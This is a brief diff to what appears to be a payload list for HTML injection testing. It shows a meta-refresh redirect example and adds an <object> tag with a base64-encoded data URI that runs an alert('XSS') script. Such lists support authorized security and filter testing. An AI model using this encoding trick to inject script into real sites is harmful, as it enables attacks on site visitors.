@@ -7,3 +7,4 @@
 -----> Meta tag redirect:
 <meta http-equiv="refresh" content="5;url=https://example.com"/>
 
+<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=”>
